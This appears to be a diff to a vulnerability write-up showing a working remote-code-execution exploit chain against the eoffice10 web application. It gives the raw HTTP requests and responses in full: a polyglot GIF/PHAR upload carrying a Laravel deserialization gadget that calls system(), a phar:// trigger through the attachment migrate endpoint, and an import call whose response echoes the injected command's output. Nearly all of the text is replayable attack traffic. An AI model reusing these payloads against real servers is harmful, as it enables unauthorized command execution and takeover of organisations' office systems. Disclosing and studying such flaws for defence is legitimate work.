@@ -24,15 +24,64 @@ User-Agent: Go-http-client/1.1
 Content-Length: 523
 Accept: string("*/*")
 Accept-Encoding: gzip, deflate
-Content-Type: multipart/form-data; boundary=ifedjiqy
+Content-Type: multipart/form-data; boundary=jzdwsbic
 
---ifedjiqy
+--jzdwsbic
 Content-Disposition: form-data; name="Filedata"; filename="register.inc"
 Content-Type: image/jpeg
 
 GIF89a<?php __HALT_COMPILER(); ?>
 D.....................O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:".*.events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:".*.queueResolver";s:6:"system";}s:8:".*.event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";s:37:"echo 9yM86ESyFBXNDwCh6Nbsxy9wrcQrP25P";}}....test.txt....K..f.....~..........test.).i..f3....2pq....>....GBMB
---ifedjiqy--
+--jzdwsbic--
+
+返回响应包
+HTTP/1.1 200 OK
+Date: Sat, 30 Mar 2024 08:43:19 GMT
+Server: Apache
+Cache-Control: no-cache, private
+Transfer-Encoding: chunked
+Content-Type: application/json
+
+{"status":1,"data":{"attachment_id":"263bcfcf49019d4735c62653c5cdbd6c","attachment_name":"register.inc"},"runtime":"0.314"}
+
+
+POST /eoffice10/server/public/api/attachment/path/migrate HTTP/1.1
+Host: 
+User-Agent: Go-http-client/1.1
+Content-Length: 69
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F
+
+回响应包
+HTTP/1.1 200 OK
+Date: Sat, 30 Mar 2024 08:43:20 GMT
+Server: Apache
+Cache-Control: no-cache, private
+Transfer-Encoding: chunked
+Content-Type: application/json
+
+{"status":1,"data":[0,false,0,false,0,0,false,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13],"runtime":"0.382"}
+
+POST /eoffice10/server/public/api/empower/import HTTP/1.1
+Host: 
+User-Agent: Go-http-client/1.1
+Content-Length: 47
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+type=tttt&file=263bcfcf49019d4735c62653c5cdbd6c
+
+返回响应包
+HTTP/1.1 200 OK
+Date: Sat, 30 Mar 2024 08:43:20 GMT
+Server: Apache
+Cache-Control: no-cache, private
+Transfer-Encoding: chunked
+Content-Type: application/json
+
+{"status":0,"errors":[{"code":"no_file","message":"\u6ce8\u518c\u6587\u4ef6\u4e0d\u5b58\u5728"}],"runtime":"0.293"}9yM86ESyFBXNDwCh6Nbsxy9wrcQrP25P
 ```
 
 
